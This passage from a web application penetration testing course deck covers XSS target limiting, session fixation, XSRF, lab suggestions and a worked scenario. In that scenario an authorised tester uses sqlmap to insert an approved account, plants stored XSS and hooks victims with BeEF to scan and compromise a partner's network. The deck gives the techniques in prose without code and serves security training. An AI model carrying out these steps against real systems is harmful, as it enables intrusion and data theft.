	- Infrastructure configuration - Firewall rule sets or web app firewall

<!--[Object 2]-->

<!--[Object 3]-->

<!--[Group 6]-->

<!--[Group 33]-->

<!--[Text Box 60]-->
**Target  
Browser**

<!--[Text Box 61]-->
**Pen  
Tester**

<!--[Text Box 62]-->
**Target**
**Web Server**

<!--[Text Box 63]-->
**Pen Tester****'s**
**Web Server**

<!--[Freeform 64]-->

<!--[Text Box 65]-->
**1. Inject content that refers to a script on pen tester****'s web server**

<!--[Freeform 66]-->

<!--[Text Box 67]-->
**2. Fetch page that refers to script on pen tester****'s site**

<!--[Text Box 68]-->
**4. Run attack XSS . if server infrastructure allows access to it**

<!--[Freeform 69]-->

<!--[Rectangle 71]-->
F  
I
R
E
W
A
L
L

<!--[Text Box 70]-->
**3. Server infrastructure determines if browser IP addr is in scope . if so, allows access to XSS attack script**

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
The final option to discuss actually uses the infrastructure of the pen-tester to determine scope.  Either our firewall or web server can determine if the request for the attack code is processed.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 102 -->
<!--[Rectangle 1040]-->

<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View,   
Pen-Testing & Scoping
- Recon & Mapping
- Server-Side Vuln Discovery
- Server-Side Vuln   
Discovery
- <span style="text-decoration: underline;">***Exploitation***</span>
- Capture the Flag

<!--[Rectangle 1043]-->
-  Exploitation 
-  Bypass Flaws
	-  Authentication Bypass
	-  **Authentication Bypass Exercise**
-  Injection Flaws
	-  SQL Injection
	-  File Handling with SQL Injection
	-  OS Interaction with SQL Injection
	-  **sqlmap Exercise**
	-  Port Scanning with SQL Injection
	-  File Injection with SQL Injection
	-  Prepared Injection Files
	- ** Prepared Files Exercise**
	-  Blind SQL Injection
	- ** Blind SQL Injection Exercise**
	-  XSS
	- ** Persistent XSS Exercise**
	-  Advanced XSS
	- ** Durzosploit Exercise**
	-  XSS Frameworks
		-  BeEF
		- ** BeEF Exercise**
	-  Limiting XSS targets
- *** ***<span style="text-decoration: underline;">***Session Flaws***</span>
	-  Session Fixation
	-  XSRF
	- ** MonkeyFist Exercise**
-  Putting It Together
	-  Attack Scenario
	-  Next Steps
	-  Conclusions

<!--[Freeform 1044]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
Next we will discuss session flaws.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 103 -->
<!--[Title 1]-->
# Session Flaws


<!--[Content Placeholder 2]-->
- Session state is a key point within web applications
- Session flaws can allow for various attacks
	- Session hijacking from predictable session IDs
	- Session fixation which is covered next

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
Session state is a critical point within most applications.  If we determine that flaws exist here, we are able to perform hijacking of a session.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 104 -->
<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View,   
Pen-Testing & Scoping
- Recon & Mapping
- Server-Side Vuln Discovery
- Server-Side Vuln   
Discovery
- <span style="text-decoration: underline;">***Exploitation***</span>
- Capture the Flag

<!--[Rectangle 1043]-->
-  Exploitation 
-  Bypass Flaws
	-  Authentication Bypass
	-  **Authentication Bypass Exercise**
-  Injection Flaws
	-  SQL Injection
	-  File Handling with SQL Injection
	-  OS Interaction with SQL Injection
	-  **sqlmap Exercise**
	-  Port Scanning with SQL Injection
	-  File Injection with SQL Injection
	-  Prepared Injection Files
	- ** Prepared Files Exercise**
	-  Blind SQL Injection
	- ** Blind SQL Injection Exercise**
	-  XSS
	- ** Persistent XSS Exercise**
	-  Advanced XSS
	- ** Durzosploit Exercise**
	-  XSS Frameworks
		-  BeEF
		- ** BeEF Exercise**
	-  Limiting XSS targets
-  Session Flaws
	- *** ***<span style="text-decoration: underline;">***Session Fixation***</span>
	-  XSRF
	- ** MonkeyFist Exercise**<span style="text-decoration: underline;">**</span>
-  Putting It Together
	-  Attack Scenario
	-  Next Steps
	-  Conclusions

<!--[Freeform 1044]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
Session fixation is a common attack vector against session state.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 105 -->
<!--[Title 1]-->
# Session Fixation


<!--[Content Placeholder 2]-->
- Session fixation allows for us to control a user's session ID
- The basic cause of the flaw is not changing the session ID after a user authenticates
- We provide a link to a user
	- The link includes the session ID
- When the user clicks and authenticates
	- We are able to use the session ID also

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
Session fixation allows us to control what session ID a user is assigned instead of attempting to predict it.  The flaw is caused because the application assigns a session ID before authentication.  Then when the user authenticates, the application continues to make use of the same session token.  The attacker is then able to receive a session ID from an application and send it to the victim.  When the victim clicks the link and authenticates, the attacker is able to then access the site using the same ID.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 106 -->
<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View,   
Pen-Testing & Scoping
- Recon & Mapping
- Server-Side Vuln Discovery
- Server-Side Vuln   
Discovery
- <span style="text-decoration: underline;">***Exploitation***</span>
- Capture the Flag

<!--[Rectangle 1043]-->
-  Exploitation 
-  Bypass Flaws
	-  Authentication Bypass
	-  **Authentication Bypass Exercise**
-  Injection Flaws
	-  SQL Injection
	-  File Handling with SQL Injection
	-  OS Interaction with SQL Injection
	-  **sqlmap Exercise**
	-  Port Scanning with SQL Injection
	-  File Injection with SQL Injection
	-  Prepared Injection Files
	- ** Prepared Files Exercise**
	-  Blind SQL Injection
	- ** Blind SQL Injection Exercise**
	-  XSS
	- ** Persistent XSS Exercise**
	-  Advanced XSS
	- ** Durzosploit Exercise**
	-  XSS Frameworks
		-  BeEF
		- ** BeEF Exercise**
	-  Limiting XSS targets
-  Session Flaws
	-  Session Fixation
	- *** ***<span style="text-decoration: underline;">***XSRF***</span>
	-  MonkeyFist Exercise
-  Putting It Together
	-  Attack Scenario
	-  Next Steps

<!--[Freeform 1044]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
The next flaw we will discuss exploiting is Cross-Site Request Forgery.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 107 -->
<!--[Title 1]-->
# Attacking XSRF


<!--[Content Placeholder 2]-->
- Exploiting XSRF involves creating web pages that hold the attack link
	- IMG or IFRAME tags are commonly used
- The attacker then needs to get the victim to view the page while they have an active session
- While creating this page sounds simple, typically we need to test multiple vulnerabilities

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
XSRF exploitation has always been a very manual process.  Once the tester finds a flaw in the web application, they must build a web page that contains a link to the vulnerable transaction.  This typically takes the form of an <img> or <iframe> tag but can use any HTML or script that will fire the link without user interaction.

The attacker then needs to get the victim to browse to the exploit page while they have an active session.  During some tests this is done by tricking a client into browsing to the page, in others the tester will work with their point of contact to validate the page or will exercise the exploit themselves.

After the victim browses to the page, the tester then needs to go verify that the attack ran.

While the creation of this page sounds simple, keep in mind that the tester typically has to test multiple vulnerabilities.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 108 -->
<!--[Rectangle 1040]-->

<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View,   
Pen-Testing & Scoping
- Recon & Mapping
- Server-Side Vuln Discovery
- Server-Side Vuln   
Discovery
- <span style="text-decoration: underline;">***Exploitation***</span>
- Capture the Flag

<!--[Rectangle 1043]-->
-  Exploitation 
-  Bypass Flaws
	-  Authentication Bypass
	-  **Authentication Bypass Exercise**
-  Injection Flaws
	-  SQL Injection
	-  File Handling with SQL Injection
	-  OS Interaction with SQL Injection
	-  **sqlmap Exercise**
	-  Port Scanning with SQL Injection
	-  File Injection with SQL Injection
	-  Prepared Injection Files
	- ** Prepared Files Exercise**
	-  Blind SQL Injection
	- ** Blind SQL Injection Exercise**
	-  XSS
	- ** Persistent XSS Exercise**
	-  Advanced XSS
	- ** Durzosploit Exercise**
	-  XSS Frameworks
		-  BeEF
		- ** BeEF Exercise**
	-  Limiting XSS targets
-  Session Flaws
	-  Session Fixation
	-  XSRF
	- *** MonkeyFist Exercise***
-  Putting It Together
	-  Attack Scenario
	-  Next Steps
	-  Conclusions

<!--[Freeform 1044]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
In this exercise we will use MonkeyFist to exploit a CSRF flaw.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 109 -->
<!--[Rectangle 1040]-->

<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View,   
Pen-Testing & Scoping
- Recon & Mapping
- Server-Side Vuln Discovery
- Server-Side Vuln   
Discovery
- <span style="text-decoration: underline;">***Exploitation***</span>
- Capture the Flag

<!--[Rectangle 1043]-->
-  Exploitation 
-  Bypass Flaws
	-  Authentication Bypass
	-  **Authentication Bypass Exercise**
-  Injection Flaws
	-  SQL Injection
	-  File Handling with SQL Injection
	-  OS Interaction with SQL Injection
	-  **sqlmap Exercise**
	-  Port Scanning with SQL Injection
	-  File Injection with SQL Injection
	-  Prepared Injection Files
	- ** Prepared Files Exercise**
	-  Blind SQL Injection
	- ** Blind SQL Injection Exercise**
	-  XSS
	- ** Persistent XSS Exercise**
	-  Advanced XSS
	- ** Durzosploit Exercise**
	-  XSS Frameworks
		-  BeEF
		- ** BeEF Exercise**
	-  Limiting XSS targets
-  Session Flaws
	-  Session Fixation
	-  XSRF
	- ** MonkeyFist Exercise**
- *** ***<span style="text-decoration: underline;">***Putting It Together***</span>
	-  Attack Scenario
	-  Next Steps
	-  Conclusions

<!--[Freeform 1044]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
The next section is where we are going to take what we have learned over the last five days and put it together.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 110 -->
<!--[Rectangle 2]-->
Putting it Together

<!--[Rectangle 3]-->
- We have now worked through our complete process
- A methodology of attack 
	- Recon
	- Mapping
	- Discovery
	- Exploitation

Note:
<!--[Rectangle 7]-->
110

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
During the past five days, we've thoroughly examined different types of web vulnerabilities from the attacker's perspective. We used a four-step methodology as the basis for our hands-on web application penetration testing, at each step gaining information or extending our access within the web application:
		Phase 1 - Reconnaissance
		Phase 2 - Mapping
		Phase 3 - Discovery
		Phase 4 - Exploitation
		
 Now, it's time for us to re-examine these four steps and examine them as an integrated process. 
 

---

<!-- Slide 111 -->
<!--[Rectangle 2]-->
A Process

<!--[Rectangle 3]-->
- These four steps make up a process
- It is cyclical and builds upon itself
- As new vulnerabilities are exploited the process starts over
- The vulnerability found becomes a pivot point

Note:
<!--[Rectangle 7]-->
111

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
It is fundamentally important to recognize that these four steps make up a cyclical process. You can't simply follow them in order, finish the last step and consider yourself done. Rather, as you expand your access and knowledge, you revisit the earlier steps and repeat the process as appropriate, leveraging your new resources to create new avenues of attack.  The point at which you leverage previously gained results to achieve greater access is commonly called a "pivot."

---

<!-- Slide 112 -->
<!--[Rectangle 2]-->
Pivot Points

<!--[Rectangle 3]-->
- Pivot points are footholds
- They may gain us information or further access into the application
- Critical to follow up on these
	- This allows us to understand the actual risk to the target

Note:
<!--[Rectangle 7]-->
112

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
As each vulnerability or new attack vector is identified, it gives us a new foothold into the application. This is called the "pivot." By leveraging pivots, we are able to reach other portions of the site or network that may or may not have been accessible to us. If they were already accessible to us, then we are accessing them in a different way, which is still very valuable in a comprehensive penetration test. 

For example, when we use SQL injection to port scan the internal network, the SQL injection vulnerability has become our pivot. 

---

<!-- Slide 113 -->
<!--[Rectangle 1040]-->

<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View,   
Pen-Testing & Scoping
- Recon & Mapping
- Server-Side Vuln Discovery
- Server-Side Vuln   
Discovery
- <span style="text-decoration: underline;">***Exploitation***</span>
- Capture the Flag

<!--[Rectangle 1043]-->
-  Exploitation 
-  Bypass Flaws
	-  Authentication Bypass
	-  **Authentication Bypass Exercise**
-  Injection Flaws
	-  SQL Injection
	-  File Handling with SQL Injection
	-  OS Interaction with SQL Injection
	-  **sqlmap Exercise**
	-  Port Scanning with SQL Injection
	-  File Injection with SQL Injection
	-  Prepared Injection Files
	- ** Prepared Files Exercise**
	-  Blind SQL Injection
	- ** Blind SQL Injection Exercise**
	-  XSS
	- ** Persistent XSS Exercise**
	-  Advanced XSS
	- ** Durzosploit Exercise**
	-  XSS Frameworks
		-  BeEF
		- ** BeEF Exercise**
	-  Limiting XSS targets
-  Session Flaws
	-  Session Fixation
	-  XSRF
	- ** MonkeyFist Exercise**
-  Putting It Together
	- *** ***<span style="text-decoration: underline;">***Attack Scenario***</span>
	-  Next Steps
	-  Conclusions

<!--[Freeform 1044]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
In the next few slides we are going to examine a sample penetration test.  This will let us explore how the various parts of the testing process fits together in a real example.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 114 -->
<!--[Rectangle 2]-->
Attack Scenario

<!--[Rectangle 3]-->
- Use our process and knowledge to examine a complete system
- We will walk through a complete attack
- This scenario is based on real tests

Note:
<!--[Rectangle 7]-->
114

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
The attack scenario is a way for us to review the materials covered over the four days.  It also lets us use the process we have learned.  First we will examine a system and the design of the application.  Then we will walk through a complete attack.  This will help us visualize the methods and processes we have just learned.

---

<!-- Slide 115 -->
<!--[Rectangle 2]-->
Scenario Setup

<!--[Rectangle 3]-->
- A server manufacturer (HAL) is the target
- The penetration tester (Penelope) has been hired to verify the security of the site
- Since this is a reseller application, other companies may be part of the scope

Note:
<!--[Rectangle 7]-->
115

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Scenario: HAL is a large manufacturer of servers.  HAL hires a penetration tester named Penelope to determine if resellers are able to access each other's information.  Penelope will start the test with no privileges within the reseller site.

---

<!-- Slide 116 -->
<!--[Rectangle 2]-->
Application Setup

<!--[Rectangle 3]-->
- Public Internet Facing site
- Links to Reseller site
- Reseller site requires authentication
- Sign-up system is available
- Sign-ups must be approved

Note:
<!--[Rectangle 7]-->
116

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
HAL has a public site that links people to their reseller site.  The reseller site requires authentication and allows the various resellers to have conversations via forums and request information.  It also allows them to manage their purchases and inventory.  To sign up, users can fill in a form on the main web site.  Sign-up forms are submitted to administrative back-end software, where HAL employees review and approve them.

---

<!-- Slide 117 -->
<!--[Rectangle 2]-->
Recon

<!--[Rectangle 3]-->
- Google Searches
	- Way to much information due to the target type
	- Infrastructure information was disclosed
	- Information regarding resellers was also found

Note:
<!--[Rectangle 7]-->
117

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Penelope performs a number of Google searches to find information.  She is able to determine that due to the nature of the client, a large amount of the information.  But she was able to determine the infrastructure that was running and found information regarding the various resellers.

---

<!-- Slide 118 -->
<!--[Rectangle 2]-->
Mapping

<!--[Rectangle 3]-->
- Nmap Port scans
	- HTTP and HTTPS only
- Server Versions
	- Current Apache install
- Uses WebScarab to spider the site
- Builds a sitemap

Note:
<!--[Rectangle 7]-->
118

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Penelope uses WebScarab to spider the web site, so that she can examine the pages at her leisure.  She builds a sitemap and determines the relationships between the pages.  At this time, she hasn't found anything interesting, but she is building a wealth of information that may help later.

---

<!-- Slide 119 -->
<!--[Rectangle 2]-->
Discovery

<!--[Rectangle 3]-->
- Reseller sign-up page is a key target within the application
- Client side filtering of SQL injection code is being used
- Easily bypassed to launch attacks
	- Using an interception proxy

Note:
<!--[Rectangle 7]-->
119

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Penelope then starts to examine the reseller sign-up form.  When she examined the source, she found that the developer was using client side filtering of SQL injection code.  By using the interception proxy features in WebScarab, she was able to bypass these filters and submit a single quote to see if an error was returned.

---

<!-- Slide 120 -->
<!--[Rectangle 2]-->
Exploitation

<!--[Rectangle 3]-->
- SQLmap was used to dump the database tables
	- Determine what fields need to be set to approve the account
- Again using sqlmap Penelope inserts a record for her account
	- Allowing logins

Note:
<!--[Rectangle 7]-->
120

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Using sqlmap, Penelope begins to dump the database tables.  Using this information, she is able to determine what fields need to be inserted and their values so that her account is approved.  She then launches sqlmap to inject a record for her account.  She can now log into the application.

---

<!-- Slide 121 -->
<!--[Rectangle 2]-->
Recon

<!--[Rectangle 3]-->
- Log into the reseller site
- Penelope now uses data from the site to further her recon
- Searches for reseller data

Note:
<!--[Rectangle 7]-->
121

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Penelope now logs into the reseller site.  She performs some additional searches based on information found up to this point.

---

<!-- Slide 122 -->
<!--[Rectangle 2]-->
Mapping

<!--[Rectangle 3]-->
- Nmap Port scans
	- HTTP and HTTPS only
- Server Versions
	- Current Apache install
- Uses WebScarab to spider the site
- Builds a sitemap

Note:
<!--[Rectangle 7]-->
122

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Penelope uses WebScarab to spider the web site, so that she can examine the pages at her leisure.  She builds a sitemap and determines the relationships between the pages.  Penelope finds that most of the site functionality is built to allow resellers ways to communicate with each other.

---

<!-- Slide 123 -->
<!--[Rectangle 2]-->
Discovery

<!--[Rectangle 3]-->
- Reseller site includes messaging features
- Post a message
	- Containing XSS code
- View the post
	- Determine if it worked

Note:
<!--[Rectangle 7]-->
123

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
At this time Penelope posts a XSS-laden message to the forum system addressed to members of the now in scope reseller's staff.  She then views the message to verify that the XSS code runs correctly.  It does, and the only step now is to figure out how to abuse this.

Penelope works with HAL to expand the scope of the project.  She and HAL get permission to expand into the resellers' networks.  This will help secure both HAL and the reseller they have contracted with.

---

<!-- Slide 124 -->
<!--[Rectangle 2]-->
Exploitation

<!--[Rectangle 3]-->
- BeEF exploitation is selected
- Inject beefmagic.js.php
- Wait for resellers to get attacked
- Control the zombies
	- Port scan the client networks

Note:
<!--[Rectangle 7]-->
124

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Penelope decides to use the BeEF system this time, since it will actually let her launch attacks against the other reseller's network infrastructure and services.  She sits and waits for the member of the reseller's staff to view her message.  When it happens, she quickly uses the port scanner in BeEF to map the other reseller's network.

At this point Penelope can start the process again, now focusing on the internal network of this reseller.  For her purposes, it was enough to use a few Metasploit exploits ported to BeEF's system to take control of various servers within the reseller's network, and download information to show the level of access she was able to accomplish.

All of this was possible, because a simple sign-up form was vulnerable to XSS and HAL felt that was an acceptable risk, since only their employees viewed the results of that form.

---

<!-- Slide 125 -->
<!--[Rectangle 1040]-->

<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View,   
Pen-Testing & Scoping
- Recon & Mapping
- Server-Side Vuln Discovery
- Server-Side Vuln   
Discovery
- <span style="text-decoration: underline;">***Exploitation***</span>
- Capture the Flag

<!--[Rectangle 1043]-->
-  Exploitation 
-  Bypass Flaws
	-  Authentication Bypass
	-  **Authentication Bypass Exercise**
-  Injection Flaws
	-  SQL Injection
	-  File Handling with SQL Injection
	-  OS Interaction with SQL Injection
	-  **sqlmap Exercise**
	-  Port Scanning with SQL Injection
	-  File Injection with SQL Injection
	-  Prepared Injection Files
	- ** Prepared Files Exercise**
	-  Blind SQL Injection
	- ** Blind SQL Injection Exercise**
	-  XSS
	- ** Persistent XSS Exercise**
	-  Advanced XSS
	- ** Durzosploit Exercise**
	-  XSS Frameworks
		-  BeEF
		- ** BeEF Exercise**
	-  Limiting XSS targets
-  Session Flaws
	-  Session Fixation
	-  XSRF
	- ** MonkeyFist Exercise**
-  Putting It Together
	-  Attack Scenario
	- *** ***<span style="text-decoration: underline;">***Next Steps***</span>
	-  Conclusions

<!--[Freeform 1044]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
This next section will outline some ideas on what to do after you get back to work.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 126 -->
<!--[Rectangle 2]-->
Next Steps

<!--[Rectangle 3]-->
- What are the next steps?
- As we finish this class, the next few items will help us continue to gain skills
- Three categories to continue:
	- Practice
	- Explore
	- Explain

Note:
<!--[Rectangle 7]-->
126

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Now that we are almost finished with the four days of exploration, you are probably thinking about what's next.  How do I take what I have learned and continue to grow it.  The next few slides will give you some ideas on where to go.

---

<!-- Slide 127 -->
<!--[Rectangle 2]-->
Practice

<!--[Rectangle 3]-->
- Practice makes perfect
- Learn more by doing
- Various methods:
	- Class DVD
		- Includes more than we covered in class
	- Vulnerable Test Applications
		- Various pre-built vulnerable applications
	- A Lab
		- Easier than we think

Note:
<!--[Rectangle 7]-->
127

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Practice goes with out saying.  If I don't practice something then I am going to forget the pieces that are important to be successful at it.  The best way to ensure that you have learned a topic is to do it.  But of course you need to be careful where you practice the techniques that we have learned since they can be malicious.  The class DVD is an excellent place to try out the various ideas.  Redo the exercises.

---

<!-- Slide 128 -->
<!--[Rectangle 2]-->
Pre-built Applications

<!--[Rectangle 3]-->
- WebGoat
	- OWASP application focused on training
	- Contains various lessons
- Mutillidae
	- IronGeek.com built a series of application for the OWASP Top 10
- Damn Vulnerable Web App (DVWA)
	- http://www.dvwa.co.uk/

Note:
<!--[Rectangle 7]-->
128

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
WebGoat is a self-contained java application that gives the user various exercises to perform.  These exercises test you in various web vulnerabilities and how to exploit them.  The system even includes a hint section so that as you go through the exercises, if you become stuck, you can get help.  As you get further through your study, you can also add other sections to the application.  I find that this is an excellent way to train your developers in specific problems they may find in your environment.

Mutillidae is a series of PHP files created by Adrian "Iron Geek" Crenshaw to explain and demonstrate the OWASP Top 10.  It can be installed onto a server for us to test against and practice.  He is continually updating the files.

DVWA is another great system that provides various vulnerable applications to attack and test against.

Keep in mind that all of these applications render the server insecure, so be careful where you use them!

---

<!-- Slide 129 -->
<!--[Rectangle 2]-->
Web Application Lab

<!--[Rectangle 3]-->
- Easier than you think
- Using virtualization we can save costs
- Use open source projects as targets
- Great way to help projects

<!--[Picture 5]-->

Note:
<!--[Rectangle 7]-->
129

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Building an web application lab is probably easier than you think.  All that you need is a web server, a browser and some form or data-store.  I typically use something like VMware or Parallels to build virtual machines that I can install applications onto and then snap back to a known good state after I have been testing them for a while.

The best place to find applications to test is the open source world.  I commonly install things from Sourceforge and test their security.  Then if I find a vulnerability, I report it back to the project.  That way I benefit from using real applications and the project benefits from having someone test their security.

---

<!-- Slide 130 -->
<!--[Rectangle 2]-->
Explore

<!--[Rectangle 3]-->
- Dig into various vulnerabilities
- Figure out new methods
- Expand our knowledge of  
 the web
- Research helps us all
- Just have fun!

<!--[Picture 4]-->

Note:
<!--[Rectangle 7]-->
130

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
I find one of the best ways to continue learning is to focus on a specific class of vulnerability and dig into it as deeply as I can.  Learn exactly why it works the way it does and see if you can find new and more exciting ways to use it.  The main goal here is to have fun.

---

<!-- Slide 131 -->
<!--[Rectangle 2]-->
Explain

<!--[Rectangle 3]-->
- Write papers to explain the issues, how to find them and solutions
- Present to local groups and organizations
- Teach classes

<!--[Picture 5]-->

Note:
<!--[Rectangle 7]-->
131

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
And of course, share your knowledge.  I have commonly found students who go on to write whitepapers or document new problems they have found.  Start a developer training program where you can help others learn how to be safer.  And do presentations on the topic.  There are tons of groups looking for people to share this type of information.

---

<!-- Slide 132 -->
<!--[Rectangle 1040]-->

<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View,   
Pen-Testing & Scoping
- Recon & Mapping
- Server-Side Vuln Discovery
- Server-Side Vuln   
Discovery
- <span style="text-decoration: underline;">***Exploitation***</span>
- Capture the Flag

<!--[Rectangle 1043]-->
-  Exploitation 
-  Bypass Flaws
	-  Authentication Bypass
	-  **Authentication Bypass Exercise**
-  Injection Flaws
	-  SQL Injection
	-  File Handling with SQL Injection
	-  OS Interaction with SQL Injection
	-  **sqlmap Exercise**
	-  Port Scanning with SQL Injection
	-  File Injection with SQL Injection
	-  Prepared Injection Files
	- ** Prepared Files Exercise**
	-  Blind SQL Injection
	- ** Blind SQL Injection Exercise**
	-  XSS
	- ** Persistent XSS Exercise**
	-  Advanced XSS
	- ** Durzosploit Exercise**
	-  XSS Frameworks
		-  BeEF
		- ** BeEF Exercise**
	-  Limiting XSS targets
-  Session Flaws
	-  Session Fixation
	-  XSRF
	- ** MonkeyFist Exercise**
-  Putting It Together
	-  Attack Scenario
	-  Next Steps
	- *** ***<span style="text-decoration: underline;">***Conclusions***</span>

<!--[Freeform 1044]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
We have now finished five days of web penetration testing and methodology.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 133 -->
<!--[Rectangle 2]-->
Conclusions

<!--[Rectangle 3]-->
- Web applications are everywhere
	- Consumer interfaces
	- Within organizations
- Easy to find developers
- Portable
- Security is crucial

Note:
<!--[Rectangle 7]-->
133

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
The web is everywhere. Not only are more and more consumer interfaces moving to the web, but increasingly, applications, appliances and devices are distributed with web-based management interfaces. If you buy a new printer, you use the web interface to configure it. In large organizations, network equipment, air conditioning systems, and other components of critical infrastructure are controlled via the web. 

There are a number of reasons for this. First, it's easy to find web developers. Web applications also tend to be very portable. There is a faster development lifecycle, and complex issues such as memory allocation are handled transparently by the scripting language, not by developers. 

Due to the increasing proliferation and widespread integration of web applications into all aspects of business and operations, web application penetration testing is critical. It is necessary not only for custom-developed in-house applications, but also for commercial off-the-shelf products. Testing should be performed during development, release, and also after deployment as new vulnerabilities are publicized. 

---

